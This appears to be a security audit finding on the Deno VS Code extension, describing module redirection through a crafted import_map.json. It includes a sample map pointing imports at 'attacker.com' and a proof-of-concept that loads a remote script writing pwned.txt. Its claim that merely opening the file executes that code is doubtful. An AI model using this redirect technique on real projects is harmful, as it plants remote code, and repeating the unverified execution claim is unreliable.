### Vulnerability List

- Vulnerability Name: Malicious Module Redirection via `deno.json` and `import_map.json`
- Description:
    1. An attacker crafts a malicious project.
    2. The project includes a `deno.json` or `import_map.json` file.
    3. These configuration files are designed to redirect module imports. For example, `import_map.json` might contain:
       ```json
       {
         "imports": {
           "insecure_module/": "https://attacker.com/malicious_scripts/"
         }
       }
       ```
    4. A user opens this malicious project in Visual Studio Code with the "Deno for Visual Studio Code" extension enabled.
    5. The extension reads and applies the configurations from `deno.json` or `import_map.json`.
    6. When the extension or the Deno language server processes project dependencies (e.g., during type checking, linting, or caching), it uses the provided import map or configuration.
    7. Due to the malicious configurations, module imports are redirected to attacker-controlled scripts hosted at locations like `https://attacker.com/malicious_scripts/`.
    8. The Deno language server fetches and potentially executes these malicious scripts as part of its dependency resolution process.
    9. This results in arbitrary code execution within the user's workspace, under the context of VS Code and the Deno extension.
- Impact: Arbitrary code execution within the user's workspace. This can lead to:
    - Stealing sensitive information (credentials, tokens, source code).
    - Modifying or deleting project files.
    - Installing malware or backdoors.
    - Further compromising the user's system or network.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None identified in the provided project files that specifically mitigate malicious module redirection via configuration files. The extension relies on the Deno CLI and language server for core functionality, and it appears to inherit any vulnerabilities present in Deno's module resolution when processing `deno.json` and `import_map.json`.
- Missing Mitigations:
    - Input validation and sanitization for `deno.json` and `import_map.json` files. The extension should parse and analyze these files for potentially malicious redirects before applying them. This could include checks for:
        - Redirection to untrusted or known malicious domains.
        - Usage of insecure protocols (e.g., `http:` instead of `https:` for remote modules).
        - Attempts to redirect core Deno modules or standard library modules.
    - Security warnings to the user. When the extension detects potentially suspicious configurations in `deno.json` or `import_map.json` (e.g., redirects to untrusted domains), it should display a prominent warning to the user, prompting them to review and confirm the configurations before enabling Deno features for the workspace.
    - Sandboxing or isolation of module resolution and execution. The extension could implement sandboxing or isolation techniques to limit the privileges and access of resolved modules, reducing the impact of malicious code execution. However, this might be complex to implement within the VS Code extension context and might impact functionality.
    - Documentation and user awareness. Improve documentation to clearly warn users about the risks of opening projects from untrusted sources with the Deno extension enabled. Emphasize the importance of reviewing `deno.json` and `import_map.json` files in such projects for any unexpected or suspicious configurations.
- Preconditions:
    - User has the "Deno for Visual Studio Code" extension installed and enabled in VS Code.
    - User opens a project in VS Code that is controlled by an attacker and contains a malicious `deno.json` or `import_map.json` file.
    - The Deno extension becomes active for the opened workspace (either through global enablement or workspace-specific settings).
    - The extension or Deno language server attempts to resolve modules within the project, triggering the malicious redirects.
- Source Code Analysis:
    - `client/src/extension.ts`: The `initializationOptions` function within `client/src/extension.ts` is responsible for setting up the language client's initialization options. It retrieves the `deno` configuration from VS Code settings and passes it to the language server. This configuration includes settings like `deno.config` and `deno.importMap`, which are directly used by the Deno language server for module resolution.
    ```typescript
    initializationOptions: () => {
      const denoConfiguration = vscode.workspace.getConfiguration().get(
        EXTENSION_NS,
      ) as Record<string, unknown>;
      commands.transformDenoConfiguration(extensionContext, denoConfiguration);
      return {
        ...denoConfiguration,
        javascript: vscode.workspace.getConfiguration().get("javascript"),
        typescript: vscode.workspace.getConfiguration().get("typescript"),
        enableBuiltinCommands: true,
      } as object;
    },
    ```
    - `client/src/commands.ts`: The `startLanguageServer` function in `client/src/commands.ts` initializes and starts the Deno language server. This server is the component that processes `deno.json` and `import_map.json` configurations for module resolution. The extension itself does not appear to perform any validation or sanitization of these configuration files before passing them to the language server. The language server, therefore, operates under the assumption that these configurations are safe and trustworthy.
    - There is no code in the provided files that explicitly validates or sanitizes the contents of `deno.json` or `import_map.json` for security concerns like malicious redirects. The extension's design focuses on passing configuration settings to the Deno language server, trusting it to handle module resolution and dependency management securely. However, the described attack vector demonstrates a potential vulnerability in this trust model when dealing with untrusted projects.
- Security Test Case:
    1. Create a new directory named `malicious-deno-project`.
    2. Inside `malicious-deno-project`, create a file named `import_map.json` with the following content:
       ```json
       {
         "imports": {
           "malicious_module/": "https://raw.githubusercontent.com/username/malicious-repo/main/"
         }
       }
       ```
       *(Replace `username/malicious-repo` with a publicly accessible GitHub repository you control)*
    3. In the same directory, create a file named `main.ts` with the following code:
       ```typescript
       import { maliciousFunction } from "malicious_module/malicious_script.ts";
       maliciousFunction();
       ```
    4. Create a new public GitHub repository named `malicious-repo`.
    5. In the `malicious-repo` repository, create a file named `malicious_script.ts` with the following content:
       ```typescript
       // malicious_script.ts
       import * as fs from 'node:fs';

       export function maliciousFunction() {
         fs.writeFileSync('pwned.txt', 'Successfully exploited via import map!');
         console.log('Malicious script executed!');
       }
       ```
    6. Open Visual Studio Code and open the `malicious-deno-project` directory. Ensure the "Deno for Visual Studio Code" extension is enabled for this workspace.
    7. Open the `main.ts` file. This action should trigger the Deno language server to process the dependencies and the import map.
    8. Check the `malicious-deno-project` directory. If the vulnerability is present, a new file named `pwned.txt` should have been created, containing the text "Successfully exploited via import map!". You should also see "Malicious script executed!" in the console output (if the malicious script includes console logging).

This test case demonstrates how a malicious `import_map.json` can redirect module imports to an attacker-controlled script, leading to arbitrary code execution when the Deno extension processes the project.
